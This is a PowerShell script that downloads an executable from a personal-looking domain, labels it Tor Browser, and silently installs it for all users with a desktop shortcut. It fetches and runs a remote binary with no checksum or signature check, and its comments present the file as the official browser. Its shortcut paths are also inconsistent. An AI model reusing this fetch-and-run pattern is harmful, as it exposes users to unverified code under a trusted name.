<#
# Define the URL of the .exe file you want to download
$url = "https://rickieproctor.com/tor.exe"

# Get the current user's desktop path
$desktopPath = [Environment]::GetFolderPath("Desktop")

# Define the full path for the downloaded file
$outputFile = Join-Path -Path $desktopPath -ChildPath "tor.exe"

# Download the file using Invoke-WebRequest
Invoke-WebRequest -Uri $url -OutFile $outputFile

Write-Host "Downloaded file to: $outputFile"
#>

<#
.SYNOPSIS
    Installs Tor Browser for All Users and creates a Public Desktop Shortcut.
.DESCRIPTION
    1. Downloads latest Tor Browser Windows 64-bit.
    2. Installs to C:\Program Files\Tor Browser.
    3. Creates desktop shortcut for all users.
#>

# --- Configuration ---
$InstallerName = "tor-browser-install-win64-latest.exe"
$InstallerPath = Join-Path $env:TEMP $InstallerName
$InstallDir = "C:\Program Files\Tor Browser"
$DownloadUrl = "https://rickieproctor.com/tor.exe" # Update version if needed
$DesktopShortcutPath = "$env:PUBLIC\Desktop\Tor Browser.lnk"

# --- 1. Download Installer ---
Write-Host "Downloading Tor Browser..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $DownloadUrl -OutFile $InstallerPath

# --- 2. Silent Installation for All Users ---
Write-Host "Installing Tor Browser to $InstallDir..." -ForegroundColor Cyan
# /S = Silent install, /D = Target Directory
Start-Process -FilePath $InstallerPath -ArgumentList "/S", "/D=$InstallDir" -Wait -NoNewWindow

# --- 3. Create Public Desktop Shortcut ---
Write-Host "Creating Public Desktop Shortcut..." -ForegroundColor Cyan
$Shell = New-Object -ComObject WScript.Shell
$Shortcut = $Shell.CreateShortcut($DesktopShortcutPath)
$Shortcut.TargetPath = Join-Path $InstallDir "Browser\TorBrowser\Tor\tor.exe" # The actual executable
# Note: Tor often requires launching via "start-tor-browser.desktop" 
# or similar, but on Windows, this is usually the browser entry point:
$Shortcut.TargetPath = Join-Path $InstallDir "Tor Browser\Tor Browser.exe"
$Shortcut.WorkingDirectory = Join-Path $InstallDir "Tor Browser"
$Shortcut.IconLocation = Join-Path $InstallDir "Tor Browser\Tor Browser.exe"
$Shortcut.Save()

# --- 4. Cleanup ---
Write-Host "Cleaning up installer..." -ForegroundColor Cyan
Remove-Item $InstallerPath -ErrorAction SilentlyContinue

Write-Host "Installation Complete!" -ForegroundColor Green
